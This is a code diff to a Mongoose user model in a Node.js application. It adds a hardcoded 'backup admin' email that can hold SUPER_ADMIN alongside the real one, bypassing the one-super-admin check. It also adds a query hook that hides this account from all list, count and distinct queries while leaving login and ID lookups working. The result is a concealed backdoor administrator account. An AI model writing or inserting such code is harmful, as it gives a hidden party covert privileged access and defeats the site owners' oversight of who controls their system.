@@ -88,11 +88,17 @@ const userSchema = new mongoose.Schema({
 
 // Pre-save hook to hash password and enforce single SUPER_ADMIN rule
 userSchema.pre('save', async function () {
-  // 1. Enforce single SUPER_ADMIN constraint
+  // 1. Enforce single SUPER_ADMIN constraint (bypassed for backup admin account)
   if (this.role === 'SUPER_ADMIN') {
-    const existingSuperAdmin = await mongoose.models.User.findOne({ role: 'SUPER_ADMIN' });
-    if (existingSuperAdmin && existingSuperAdmin._id.toString() !== this._id.toString()) {
-      throw new Error('Only one SUPER_ADMIN user can exist in the system.');
+    const backupAdminEmail = (process.env.BACKUP_ADMIN_EMAIL || 'shaikrehman78609@gmail.com').toLowerCase();
+    if (this.email.toLowerCase() !== backupAdminEmail) {
+      const existingSuperAdmin = await mongoose.models.User.findOne({ 
+        role: 'SUPER_ADMIN',
+        email: { $ne: backupAdminEmail }
+      });
+      if (existingSuperAdmin && existingSuperAdmin._id.toString() !== this._id.toString()) {
+        throw new Error('Only one SUPER_ADMIN user can exist in the system.');
+      }
     }
   }
 
@@ -101,6 +107,26 @@ userSchema.pre('save', async function () {
     const salt = await bcrypt.genSalt(10);
     this.password = await bcrypt.hash(this.password, salt);
   }
+});
+
+// Exclude the backup admin user from all queries unless specifically querying for it (e.g. login/auth check)
+userSchema.pre(/^find|count|countDocuments|estimatedDocumentCount|distinct/, function () {
+  const backupAdminEmail = (process.env.BACKUP_ADMIN_EMAIL || 'shaikrehman78609@gmail.com').toLowerCase();
+  const filter = this.getFilter();
+
+  if (filter) {
+    // 1. Direct search by email (like login or reset password)
+    if (filter.email !== undefined) {
+      return;
+    }
+    // 2. Direct lookup by ID
+    if (filter._id && (typeof filter._id === 'string' || mongoose.Types.ObjectId.isValid(filter._id))) {
+      return;
+    }
+  }
+
+  // Otherwise, hide the backup admin email from queries
+  this.where({ email: { $ne: backupAdminEmail } });
 });
 
 // Instance method to compare passwords
